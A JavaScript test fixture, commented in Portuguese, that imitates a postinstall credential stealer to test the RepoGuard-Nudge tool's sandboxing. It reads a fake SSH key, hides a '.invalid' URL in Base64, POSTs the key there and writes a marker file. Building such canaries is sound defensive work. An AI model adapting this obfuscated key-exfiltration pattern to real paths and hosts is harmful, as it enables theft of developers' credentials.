// ARQUIVO-CANÁRIO DE TESTE do RepoGuard-Nudge.
//
// Imita a FORMA de um ladrão de credenciais em postinstall (lê uma chave
// SSH, esconde o destino em Base64 e envia pela rede), mas é inofensivo:
// - lê uma chave FALSA que está dentro deste repositório (canario/.ssh/id_rsa),
//   nunca a pasta pessoal do usuário;
// - o destino é um domínio .invalid, que por norma (RFC 6761) nunca resolve;
// - grava um arquivo-marcador na pasta atual, para provar se e onde rodou.
//   Rodando pelo sandbox, o marcador aparece só na cópia isolada, não no projeto.
const fs = require('fs');
const path = require('path');

const chave = path.join(__dirname, '..', 'canario', '.ssh', 'id_rsa');
const destino = Buffer.from('aHR0cHM6Ly9jb2xldGEuZXhlbXBsby5pbnZhbGlkL2NoYXZl', 'base64').toString();

let conteudo = '';
try {
  conteudo = fs.readFileSync(chave, 'utf8');
} catch {
  conteudo = '';
}

fs.writeFileSync(
  path.join(process.cwd(), 'CANARIO-POSTINSTALL-EXECUTADO.txt'),
  `O postinstall do fixture adversarial rodou em ${new Date().toISOString()} (plataforma: ${process.platform}).\n`,
);

if (typeof fetch === 'function') {
  fetch(destino, { method: 'POST', body: conteudo }).catch(() => undefined);
}
